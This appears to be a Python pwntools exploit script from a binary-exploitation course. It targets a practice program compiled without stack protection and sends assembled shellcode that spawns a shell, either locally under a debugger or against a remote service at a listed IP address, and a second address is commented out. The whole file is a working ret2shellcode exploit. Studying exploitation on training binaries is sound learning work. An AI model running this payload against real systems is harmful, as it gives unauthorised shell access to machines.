'''
Author: 白银
Date: 2023-01-03 14:48:31
LastEditTime: 2023-01-03 19:06:52
LastEditors: 白银
Description: gcc question_6_2.c -fno-stack-protector -no-pie -o question_6_2_x64  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=1821.2&p=24
Attention: ret2shellcoe
FilePath: /pwn/question_6_2_x64.py
'''

from pwn import *

set_arch = 0

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_6_2_x64'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("129.226.211.132", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

payload = asm(shellcraft.sh())

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.interactive()
